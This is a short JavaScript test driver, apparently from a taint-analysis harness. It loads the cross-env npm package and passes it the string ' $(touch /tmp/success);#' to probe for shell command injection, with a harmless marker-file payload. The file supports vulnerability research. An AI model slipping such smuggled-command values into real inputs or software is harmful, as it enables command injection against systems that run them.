// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/cross-env/node_modules/cross-env');
try {
	var x0 = " $(touch /tmp/success);#";
var x1 = [".", "\nkP$S", "."];
new PUT["crossEnv"](x0,x1)();
} catch (e) {
	console.log(e);
}